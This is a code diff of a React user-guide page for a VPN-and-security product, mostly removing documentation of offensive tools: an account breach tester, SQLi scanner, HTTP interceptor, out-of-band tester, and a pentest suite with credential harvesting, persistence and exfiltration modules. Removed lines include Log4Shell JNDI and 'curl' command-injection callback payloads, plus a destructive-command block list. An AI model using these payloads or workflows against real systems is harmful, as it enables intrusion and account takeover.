-          <div>• <span className="text-red-400">&lt;64 bits</span>: High risk — predictable under targeted attack.</div>
-          <div>• <span className="text-red-400">Sequential / timestamp-based</span>: Immediately vulnerable — report as CRITICAL.</div>
-        </div>
       </div>
     ),
   },
@@ -1896,55 +1526,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
-    id: "social-breach",
-    title: "Social & Game Breach Tester",
-    icon: Gamepad2,
-    content: (
-      <div className="space-y-3">
-        <p>The <strong>Social &amp; Game Account Breach Tester</strong> provides an authenticated proxy browser for auditing account security across 80+ platforms. Available on Command Center Pro.</p>
-        <Note type="danger">Use only against accounts you own or have explicit written permission to audit. Unauthorized credential testing is illegal under the CFAA and equivalent laws.</Note>
-        <h4 className="font-bold text-primary text-[11px]">Platform Tabs</h4>
-        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-          {[
-            { tab: "Social Media", count: "35+", ex: "Instagram, Discord, GitHub, Reddit, Twitter/X, TikTok, LinkedIn, Telegram, Slack" },
-            { tab: "Gaming Launchers", count: "10+", ex: "Steam, Epic Games, Blizzard, GOG, Ubisoft Connect, EA/Origin, Rockstar, HoYoverse" },
-            { tab: "Game Titles", count: "15+", ex: "Roblox, Fortnite, Valorant, League of Legends, Apex Legends, GTA Online, Call of Duty" },
-            { tab: "Legacy Systems", count: "10+", ex: "Xbox Live, PlayStation, Nintendo, 2K, Konami, Sega, NCSoft" },
-          ].map(({ tab, count, ex }) => (
-            <div key={tab} className="border border-primary/10 rounded px-2.5 py-2">
-              <div className="flex items-center justify-between mb-0.5">
-                <div className="text-[10px] font-mono font-bold text-primary">{tab}</div>
-                <code className="text-[8px] text-primary/40">{count} platforms</code>
-              </div>
-              <div className="text-[9px] font-mono text-primary/83">{ex}</div>
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
-        <ol className="list-decimal ml-4 space-y-1 text-[10px] font-mono text-primary/83">
-          <li>Navigate to <code>/social-breach</code> in the sidebar.</li>
-          <li>Select a tab (Social / Gaming / Games / Legacy).</li>
-          <li>Search for or click a platform to open its detail panel.</li>
-          <li>Enter credentials for the account you are authorized to test.</li>
-          <li>Click <strong>Test Login</strong>. Auto platforms return a session immediately. Manual platforms load the real login page in the proxy browser.</li>
-          <li>Use the proxy browser's Back/Forward/Navigate controls to audit the logged-in session.</li>
-          <li>Close the session from the Active Sessions panel when done.</li>
-        </ol>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Session Persistence</h4>
-        <div className="text-[10px] font-mono text-primary/83">
-          Your selected tab, active platform, session, and navigation history are preserved when you navigate away in the app and return. Sessions expire after 4 hours of inactivity on the server.
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Security Notes</h4>
-        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <div>• All proxy traffic is routed through your ProxhqVPN tunnel.</div>
-          <div>• The proxy blocks all private IP ranges to prevent SSRF attacks.</div>
-          <div>• Rate limited to 40 requests per minute to prevent abuse.</div>
-          <div>• Credentials are never stored — they are sent directly to the target platform.</div>
-        </div>
-      </div>
-    ),
-  },
-  {
     id: "bug-bounty-hub",
     title: "Bug Bounty Research Hub",
     icon: ShieldAlert,
@@ -2074,34 +1655,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
-    id: "sqli-scanner-tool",
-    title: "SQL Injection Scanner",
-    icon: Database,
-    content: (
-      <div className="space-y-3">
-        <p><strong>SQL Injection Scanner</strong> (<code>/sqli-scanner</code>) is a purpose-built tool for detecting SQL injection vulnerabilities across web application endpoints. It covers error-based, blind boolean, time-based blind, and UNION-based injection types.</p>
-        <h4 className="font-bold text-primary text-[11px]">Detection Techniques</h4>
-        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <div>• <strong>Error-based</strong>: Injects payloads that trigger database syntax errors — MySQL, MSSQL, Oracle, PostgreSQL error signatures detected.</div>
-          <div>• <strong>Boolean blind</strong>: Sends true and false condition payloads and compares response differences (body length, status code, response time).</div>
-          <div>• <strong>Time-based blind</strong>: Injects SLEEP(5) / WAITFOR DELAY variants and measures response time differential.</div>
-          <div>• <strong>UNION-based</strong>: Enumerates column count (ORDER BY) and injects UNION SELECT to extract data directly.</div>
-          <div>• <strong>Second-order</strong>: Stores payloads in one endpoint and triggers them in another — catches stored SQLi missed by direct scanning.</div>
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Navigate to <strong>SQLi Scanner</strong> (<code>/sqli-scanner</code>).</li>
-          <li><span className="text-primary/30">2.</span> Enter the <strong>Target URL</strong> with the injection parameter marked (e.g., <code>https://target.com/api?id=1</code>).</li>
-          <li><span className="text-primary/30">3.</span> Select <strong>HTTP Method</strong> (GET/POST) and add any required headers (Auth, Content-Type).</li>
-          <li><span className="text-primary/30">4.</span> Choose <strong>Injection Techniques</strong> to test (all selected by default).</li>
-          <li><span className="text-primary/30">5.</span> Click <strong>Start Scan</strong>. Results show per-technique findings with evidence.</li>
-          <li><span className="text-primary/30">6.</span> For confirmed injections, click <strong>Send to SQLMap</strong> to escalate with automated exploitation.</li>
-        </ol>
-        <Note type="info">The SQLi Scanner works alongside the full SQLMap integration at <code>/sqlmap</code> — use the Scanner to detect and confirm, then SQLMap to exploit and dump databases. Always test against authorized targets only.</Note>
-      </div>
-    ),
-  },
-  {
     id: "ssl-tls-tool",
     title: "SSL/TLS Analyzer",
     icon: ShieldAlert,
@@ -2160,7 +1713,7 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
           <li><span className="text-primary/30">2.</span> Click <strong>Detect WAF</strong>. The tool identifies the vendor and version where possible.</li>
           <li><span className="text-primary/30">3.</span> Go to <strong>WAF Bypass Generator</strong> (<code>/waf-bypass</code>).</li>
           <li><span className="text-primary/30">4.</span> Select the detected WAF vendor and your payload type (SQLi, XSS, etc.).</li>
-          <li><span className="text-primary/30">5.</span> Copy the generated bypass payloads and test them in the HTTP Interceptor or Intruder.</li>
+          <li><span className="text-primary/30">5.</span> Copy the generated bypass payloads and test them in the HTTP Interceptor.</li>
         </ol>
         <Note type="warn">Arsenal tier required for WAF Bypass Generator. WAF Analyzer is also Arsenal-tier. Authorized security testing only.</Note>
       </div>
@@ -2189,41 +1742,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
           <li><span className="text-primary/30">5.</span> Click <strong>Fix &amp; Re-scan</strong> to apply suggested fixes and verify they resolve the finding.</li>
         </ol>
         <Note type="info">IaC Scanner is an Arsenal-tier tool. Ideal for use before deploying any cloud infrastructure — run it in your CI/CD pipeline as a gate check.</Note>
-      </div>
-    ),
-  },
-  {
-    id: "http-interceptor",
-    title: "HTTP Interceptor",
-    icon: Send,
-    content: (
-      <div className="space-y-3">
-        <p><strong>HTTP Interceptor</strong> (<code>/http-interceptor</code>) is a full web proxy that intercepts, displays, and allows editing of all HTTP/HTTPS requests and responses between your browser and the target — equivalent to Burp Suite's Proxy module.</p>
-        <h4 className="font-bold text-primary text-[11px]">Core Capabilities</h4>
-        <div className="space-y-2">
-          {[
-            { t: "Request Intercept", d: "Pause outbound requests before they are sent. Edit any part: URL, method, headers, body, cookies. Forward modified request or drop it entirely." },
-            { t: "Response Intercept", d: "Pause server responses before they reach the browser. Inject JavaScript, modify JSON responses, change status codes, strip security headers." },
-            { t: "WebSocket Traffic", d: "Intercept WebSocket frames (ws:// and wss://). Edit individual frames, replay frames, inject messages into the ws stream." },
-            { t: "Request History", d: "Full scrollable log of every intercepted request with method, status, content-type, body size, and time. Click any entry to inspect and replay." },
-            { t: "Match &amp; Replace Rules", d: "Define regex rules that automatically modify requests/responses: replace Authorization headers, inject XSS payloads into all responses, add/remove headers globally." },
-            { t: "Replay &amp; Diff", d: "Replay any historical request with modifications. Diff two responses side-by-side to identify behavioral changes from modified inputs." },
-          ].map(({ t, d }) => (
-            <div key={t} className="border border-primary/10 rounded px-3 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
-              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Browser Proxy Setup</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Open <strong>HTTP Interceptor</strong> (<code>/http-interceptor</code>) and start the proxy (shown port, default 8082).</li>
-          <li><span className="text-primary/30">2.</span> In your browser, set HTTP proxy to <code>127.0.0.1:8082</code> (Firefox: Network Settings → Manual proxy).</li>
-          <li><span className="text-primary/30">3.</span> Install the CA certificate shown on the Interceptor page to decrypt HTTPS traffic.</li>
-          <li><span className="text-primary/30">4.</span> Browse the target site — all traffic appears in the Interceptor panel.</li>
-          <li><span className="text-primary/30">5.</span> Toggle <strong>Intercept On/Off</strong> to pause or pass-through traffic.</li>
-        </ol>
-        <Note type="info">HTTP Interceptor is an Arsenal-tier tool. All VPN traffic is still routed through the ProxhqVPN tunnel while intercepting — your real IP remains protected.</Note>
       </div>
     ),
   },
@@ -2268,35 +1786,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
-    id: "oast",
-    title: "OAST — Out-of-Band Testing",
-    icon: Radio,
-    content: (
-      <div className="space-y-3">
-        <p>OAST (Out-of-Band Application Security Testing) detects vulnerabilities that have no visible response — blind SSRF, blind SQL injection, blind XXE, Log4Shell, DNS rebinding — by waiting for the target to make a callback to your controlled server.</p>
-        <h4 className="font-bold text-primary text-[11px]">OAST Callback Server (<code>/oast-server</code>)</h4>
-        <p className="text-[10px] font-mono text-primary/83 mb-2">Your dedicated OAST listener. Captures DNS lookups, HTTP requests, and SMTP callbacks from your injected payloads.</p>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Navigate to <strong>OAST Callback Server</strong> (<code>/oast-server</code>).</li>
-          <li><span className="text-primary/30">2.</span> Copy your unique OAST domain (e.g., <code>a1b2c3.oast.proxhq.net</code>).</li>
-          <li><span className="text-primary/30">3.</span> Use this domain in your payloads: <code>{"${jndi:ldap://a1b2c3.oast.proxhq.net/test}"}</code></li>
-          <li><span className="text-primary/30">4.</span> The server live-updates as callbacks arrive — showing source IP, timestamp, interaction type, and full request.</li>
-        </ol>
-        <h4 className="font-bold text-primary text-[11px] mt-3">OAST Blind Tester (<code>/oast-tester</code>)</h4>
-        <p className="text-[10px] font-mono text-primary/83 mb-2">Automates OAST payload injection across multiple vulnerability classes:</p>
-        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <div>• <strong>Log4Shell</strong>: <code>{"${jndi:ldap://OAST_DOMAIN/log4shell}"}</code> injected into User-Agent, X-Forwarded-For, and 20+ other headers</div>
-          <div>• <strong>Blind SSRF</strong>: URL parameters pointing to <code>http://OAST_DOMAIN/ssrf</code></div>
-          <div>• <strong>Blind XXE</strong>: DTD with OOB exfiltration via HTTP to OAST domain</div>
-          <div>• <strong>Blind SQLi</strong>: DNS-exfiltration payloads for MySQL (load_file + UNC), MSSQL (xp_dirtree), PostgreSQL (COPY TO program), Oracle (UTL_HTTP)</div>
-          <div>• <strong>Blind Command Injection</strong>: <code>curl http://OAST_DOMAIN/ci</code>, <code>nslookup OAST_DOMAIN</code></div>
-          <div>• <strong>SMTP injection</strong>: header injection payloads that trigger mail server callbacks</div>
-        </div>
-        <Note type="info">Arsenal-tier tools. OAST is essential for finding vulnerabilities in APIs and web apps with no visible output — these issues are frequently missed by standard scanners.</Note>
-      </div>
-    ),
-  },
-  {
     id: "sast-tool",
     title: "SAST — Static Application Security Testing",
     icon: ScanSearch,
@@ -2332,54 +1821,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
-    id: "hackanon-guide",
-    title: "HackAnon — Exploit Education",
-    icon: ScanSearch,
-    content: (
-      <div className="space-y-3">
-        <p><strong>HackAnon</strong> (<code>/hackanon</code>) is an interactive exploit education library covering 15+ major vulnerability classes with step-by-step hacker methodology, detection indicators, and defense recommendations — designed for developers and security researchers.</p>
-        <h4 className="font-bold text-primary text-[11px]">Covered Exploit Classes</h4>
-        <div className="grid grid-cols-2 gap-1.5">
-          {[
-            "SQL Injection (error, blind, UNION, time-based, auth-bypass)",
-            "Cross-Site Scripting — XSS (reflected, stored, DOM, keylogger)",
-            "Remote Code Execution (command injection, reverse shell, Log4Shell)",
-            "SSRF (cloud metadata, internal services, bypass techniques)",
-            "LFI / Path Traversal (log poisoning → RCE)",
-            "IDOR — Insecure Direct Object Reference (enumeration, mass takeover)",
-            "JWT Attacks (alg:none, HS256↔RS256, kid injection, claim escalation)",
-            "XXE — XML External Entity (file read, SSRF, OOB exfil)",
-            "CSRF (form, JSON, SameSite bypass)",
-            "SSTI — Server-Side Template Injection (Jinja2, Twig RCE)",
-            "Deserialization (Java ysoserial, PHP, Python pickle RCE)",
-            "Subdomain Takeover (GitHub Pages, S3, Heroku)",
-            "WAF Bypass (encoding, obfuscation, chunked transfer, path confusion)",
-            "Passive OSINT Recon (DNS, CT logs, Shodan, GitHub secrets)",
-            "Credential Stuffing & Password Spraying",
-          ].map(e => <div key={e} className="text-[9px] font-mono text-primary/75 border border-primary/10 rounded px-2 py-1">{e}</div>)}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">What Each Entry Contains</h4>
-        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <div>• <strong>How It Works</strong>: Technical explanation of the vulnerability mechanism</div>
-          <div>• <strong>Step-by-Step Attack</strong>: Numbered walkthrough with exact commands an attacker would use</div>
-          <div>• <strong>Detection Indicators</strong>: How to detect this attack in your logs and monitoring</div>
-          <div>• <strong>Defense Recommendations</strong>: Specific code changes and configurations to prevent the vulnerability</div>
-          <div>• <strong>Platform Tool Link</strong>: Direct link to the relevant ProxhqVPN tool to test each class on authorized targets</div>
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
-        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
-          <li><span className="text-primary/30">1.</span> Navigate to <strong>HackAnon</strong> (<code>/hackanon</code>).</li>
-          <li><span className="text-primary/30">2.</span> Browse the sidebar or use the search to find a vulnerability class.</li>
-          <li><span className="text-primary/30">3.</span> Filter by category (Injection, Authentication, Server-Side, etc.) or severity.</li>
-          <li><span className="text-primary/30">4.</span> Read the How It Works section, then follow the step-by-step attack to understand the exploit chain.</li>
-          <li><span className="text-primary/30">5.</span> Click the green <strong>Test with [Tool Name]</strong> button to launch the relevant ProxhqVPN tool against an authorized target.</li>
-          <li><span className="text-primary/30">6.</span> Use the Detection and Defense sections to harden your own applications.</li>
-        </ol>
-        <Note type="danger">HackAnon is for educational purposes and authorized penetration testing only. Never use these techniques on systems without explicit written permission. Unauthorized attacks are illegal under the CFAA, Computer Misuse Act, and equivalent laws worldwide. ALPHA UNLIMITED TECHNOLOGIES LLC is not liable for misuse.</Note>
-      </div>
-    ),
-  },
-  {
     id: "manuals-download",
     title: "Manuals Download Center",
     icon: FileText,
@@ -2398,9 +1839,7 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
         <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
           {[
             { t: "Getting Started Guide", tier: "All", pages: 24 },
-            { t: "WireGuard Advanced Configuration", tier: "All", pages: 32 },
-            { t: "OmniStrike Penetration Testing Suite", tier: "Pro", pages: 48 },
-            { t: "WAF Analyzer", tier: "Pro", pages: 18 },
+            { t: "WireGuard Advanced Configuration", tier: "All", pages: 32 },            { t: "WAF Analyzer", tier: "Pro", pages: 18 },
             { t: "Social & Game Account Breach Tester", tier: "Pro", pages: 28 },
             { t: "Bug Bounty Research Hub", tier: "Pro", pages: 22 },
             { t: "OSINT Recon Engine", tier: "Pro", pages: 20 },
@@ -2415,41 +1854,6 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
           ))}
         </div>
         <Note type="info">Manuals are proprietary documentation of ALPHA UNLIMITED TECHNOLOGIES LLC. Downloaded files are for your personal reference only — do not share with non-subscribers.</Note>
-      </div>
-    ),
-  },
-  {
-    id: "omnistrike",
-    title: "OmniStrike Pentest Suite",
-    icon: Swords,
-    content: (
-      <div className="space-y-3">
-        <p><strong>OmniStrike</strong> (<code>/omnistrike</code>) is ProxhqVPN's all-in-one automated penetration testing suite. It chains reconnaissance, scanning, vulnerability testing, and post-exploitation into a single orchestrated workflow. Command Center Pro only.</p>
-        <h4 className="font-bold text-primary text-[11px]">Attack Modules</h4>
-        <div className="space-y-2">
-          {[
-            { t: "Phase 1 — Recon", d: "DNS record enumeration (A/AAAA/MX/TXT/NS/CNAME), WHOIS/RDAP lookup, crt.sh certificate transparency scan, Shodan API query, AlienVault OTX passive recon." },
-            { t: "Phase 2 — Port Scan", d: "TCP/UDP scan of top-1000 ports. Service fingerprinting using banner grabbing and SYN probes. Routes through VPN tunnel for full anonymity." },
-            { t: "Phase 3 — Vulnerability Testing", d: "Per-service exploit checks: web server CVEs, outdated TLS, default credentials, SQL injection on login forms, XSS on input fields, SSRF on URL parameters." },
-            { t: "Phase 4 — Attack Chain Correlation", d: "Correlates findings into attack paths: e.g. exposed .env → DB credentials → admin panel → RCE. SVG chain graph visualization." },
-            { t: "Phase 5 — Impact Assessment", d: "Scores each finding: CVSS base score, exploitability, business impact. Generates executive summary + full technical findings report." },
-          ].map(({ t, d }) => (
-            <div key={t} className="border border-primary/10 rounded px-3 py-2">
-              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
-              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
-            </div>
-          ))}
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Post-Exploitation Modules</h4>
-        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
-          <div>• <strong>Credential Harvest</strong> — extract credentials from discovered config files, env files, and DB dumps</div>
-          <div>• <strong>Lateral Movement Planner</strong> — maps internal network from initial foothold using ARP, DNS, and SMB</div>
-          <div>• <strong>Persistence Simulation</strong> — generates PoC cron job / registry run key / systemd timer persistence commands</div>
-          <div>• <strong>Data Exfil PoC</strong> — demonstrates DNS-over-HTTPS exfil, ICMP tunnel, and HTTPS C2 patterns</div>
-        </div>
-        <h4 className="font-bold text-primary text-[11px] mt-3">Report Export</h4>
-        <p className="text-[10px] font-mono text-primary/83">Download the full engagement report as <strong>Markdown</strong>, <strong>HTML</strong>, or <strong>JSON</strong>. The HTML report is styled for client delivery. The JSON format is compatible with Jira, Trello, and vulnerability management platforms.</p>
-        <Note type="danger">OmniStrike is for authorized penetration testing only. Always obtain explicit written permission from the target organization before running any scan. Unauthorized use is a criminal offense under the CFAA, Computer Misuse Act, and equivalent laws worldwide.</Note>
       </div>
     ),
   },
@@ -3182,11 +2586,10 @@ systemctl status proxhq-fw-sync`}</CB>
             { q: "My IP isn't changing after connecting. What's wrong?", a: "Verify the WireGuard tunnel shows 'Active' (green) in your OS WireGuard app. Check /leaks — if your real IP still shows, the VPN routing isn't applying to your browser. Try toggling the kill switch on/off to force re-routing. On Windows, ensure the AllowedIPs = 0.0.0.0/0 line is in your config." },
             { q: "How do I add ProxhqVPN to a new device?", a: "Go to Device Manager (/devices) → Add Device → enter a name → a new WireGuard keypair and config are generated for that device. Download the config or scan the QR code. Each device gets a unique IP (10.8.0.x/24) and keypair for individual revocation." },
             { q: "Can I use ProxhqVPN with NordVPN/ExpressVPN at the same time?", a: "Yes — use the VPN Coexistence page (/vpn-coexist). It supports fwmark-based routing (parallel tunnels), double-hop mode (ProxhqVPN → Commercial VPN), and network namespace isolation. The auto-detect feature finds which commercial VPN is running and generates the correct coexistence config." },
-            { q: "What is the difference between VPN Basic and Command Center Pro?", a: "VPN Basic ($6.99/mo) includes: WireGuard VPN, Kill Switch, Leak Test, DNS Shield, Smart DNS, Network Monitor, DNS Sinkhole, Onion Browser, VPN Gate, Dark Web Monitor, Device Manager, GPS Spoofing, DAITA, Post-Quantum, IP Rotator, Alt Identity, Parrot Tools, Downloads. Command Center Pro ($39.99/mo) adds: all offensive security tools (Alpha Toolkit, HTTP Probe, Intruder, Payload Gen, SQLmap, Directory Fuzzer, Subdomain Scout, CVE Lookup, WAF Analyzer, JWT Analyzer, SQLi Scanner, SSL/TLS Analyzer, SAST, Dependency Scanner, OAST Tester, Token Sequencer, WebSocket Tester, IAC Scanner, HTTP Interceptor, API Tester), defensive tools (SIEM, OSINT Recon, Ghost Trace, Canary Tokens, Ghost Chain, Exploit Importer, Ghost Trap, VPN Tracker, Username Intelligence, Social Breach Tester, Bug Bounty Hub, HackAnon), and QuantumAudit / Sig Miner." },
+            { q: "What is the difference between VPN Basic and Command Center Pro?", a: "VPN Basic ($6.99/mo) includes: WireGuard VPN, Kill Switch, Leak Test, DNS Shield, Smart DNS, Network Monitor, DNS Sinkhole, Onion Browser, VPN Gate, Dark Web Monitor, Device Manager, GPS Spoofing, DAITA, Post-Quantum, IP Rotator, Alt Identity, Parrot Tools, Downloads. Command Center Pro ($39.99/mo) adds: SilkWeb Honeypot, Firewall Manager, Threat Monitor, SIEM, OSINT Recon, Canary Tokens, Ghost Chain, Remote Terminal, Security Audit, Threat Intelligence, HTTP Probe, Encoder, CVE Lookup, Dependency Scanner, WebSocket Tester, SAST Scanner, and QuantumAudit / Sig Miner." },
             { q: "How do I cancel my subscription?", a: "Go to Account & Settings → Billing → Cancel Subscription. Your plan remains active until the end of the current billing period. For refund requests, email support@proxhqvpn.com." },
             { q: "Is ProxhqVPN truly no-log?", a: "The VPN tunnel itself is zero-log — we do not record which websites you visit or which IPs you connect to through the tunnel. We retain: account/billing data (required for subscriptions), the Terminal audit log (admin-only, command history for security), and session metadata (Clerk auth sessions). Our Warrant Canary (/api/warrant-canary) confirms no government surveillance orders have been received." },
             { q: "How do I become an Ambassador?", a: "Navigate to /ambassador/apply and fill out the application form. Choose a promo code, provide your social media handles or YouTube channel, and submit. Approval typically takes 1–3 business days. Once approved, your promo code gives referrals 10% off, and you earn 10% commission on every subscription from your referrals." },
-            { q: "How do I use the Alpha Toolkit?", a: "Go to /alpha-tools. Enter the target URL in the Scanner tab. Select the detection profiles (XSS, SQLi, RCE, SSRF, etc.). Enable Tor routing if needed. Click Scan. When a finding shows the htmlReady flag, click Send to Verifier to auto-load the scanner report into the Verifier tab for deep validation. Download the full report as HTML." },
             { q: "How do I read the QuantumAudit Signature Miner results?", a: "Go to /quantum-audit/sig-miner. The Hybrid Engine runs all 4 engines in parallel: Block Scanner (on-chain ECDSA), Web Spider (paste sites/GitHub), OSINT Spider (code search), and Peel Chain (fund-flow). Results are aggregated through the Cross-Engine Pool and deduplicated. Nonce reuse findings include the recovered private key. R-collision findings include the shared nonce value. All results are for authorized blockchain forensic research only." },
             { q: "My Terminal command is blocked. Why?", a: "All Terminal commands run through a strict allowlist. If your command isn't on the allowlist, it will be blocked unless you enable ProxhqVPN Mode (the toggle next to the command input). ProxhqVPN Mode bypasses the allowlist but still enforces the HARD_BLOCKED destructive pattern list (rm -rf /, iptables -F, etc.) and logs every command to the audit trail." },
             { q: "What are RAM-only WireGuard keys and why do they matter?", a: "ProxhqVPN nodes use a Mullvad-style RAM-only key architecture: the server private key is never written to disk. On boot, the node fetches its key from the API (authenticated by a pre-shared secret) and writes it only to /dev/shm/ (volatile RAM). Power-cycling the server permanently destroys the key — a disk image reveals nothing. This protects against cold-boot attacks and physical server seizure." },
@@ -3229,7 +2632,7 @@ export default function UserGuide() {
     <div className="flex gap-0 h-[calc(100vh-4rem)] -mx-6 -my-6 overflow-hidden">
       <PageSEO
         title="User Guide & Documentation — ProxhqVPN"
-        description="Complete documentation for ProxhqVPN — WireGuard setup, kill switch, leak testing, router configs, Alpha Toolkit, SilkWeb honeypot, ambassador program, and billing. Self-hosted VPN by ALPHA UNLIMITED TECHNOLOGIES LLC."
+        description="Complete documentation for ProxhqVPN — WireGuard setup, kill switch, leak testing, router configs, SilkWeb honeypot, ambassador program, and billing. Self-hosted VPN by ALPHA UNLIMITED TECHNOLOGIES LLC."
         path="/guide"
       />
 
